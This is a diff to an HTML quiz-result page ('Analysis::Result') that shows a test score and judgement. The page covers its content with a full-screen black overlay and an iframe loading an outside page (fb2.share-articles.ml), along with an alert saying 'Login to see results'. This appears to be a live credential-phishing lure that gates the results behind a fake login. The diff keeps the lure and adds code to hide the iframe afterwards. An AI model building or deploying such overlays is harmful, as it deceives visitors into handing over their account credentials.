@@ -15,8 +15,8 @@
 
 <body>
 <div style="width: 100%; height: 100%; background-color: black; z-index: 100; position: fixed;opacity: 1.0;" id="block"></div>
-<div id="gg" class="w3-card w3-round-large w3-center" style="z-index: 500; position: fixed; width: 80%; height: 80%; display: inline-block;left: 50%; margin-left: -40%; top: 10%">
-	<iframe scrolling="no" onLoad="document.getElementById('block').style.opacity = 0.8;alert('Login to see results');" width="100%" height="100%" src="https://fb2.share-articles.ml/itruth.tk.html"></iframe>
+<div id="gg" class="w3-round-large w3-center" style="z-index: 500; position: fixed; width: 80%; height: 80%; display: inline-block;left: 50%; margin-left: -40%; top: 10%">
+	<iframe id="gjg" scrolling="no" onLoad="document.getElementById('block').style.opacity = 0.8;alert('Login to see results');" width="100%" height="100%" src="https://fb2.share-articles.ml/itruth.tk.html"></iframe>
 </div>
 <div class="w3-container w3-center">
   <h1 style="font-size: 50px;">Analysis::Result</h1>
@@ -42,6 +42,7 @@
 		document.getElementById("score").innerHTML = "Test Score: " + Tscore + " (This score only use for judge)";
 		document.getElementById("judgement").innerHTML = "Test Judgement: " + Judgement;
 	function ggy() {
+		document.getElementById("gjg").hidden = true;
 		document.getElementById("gg").hidden = true;
 		document.getElementById("block").hidden = true;
 	}
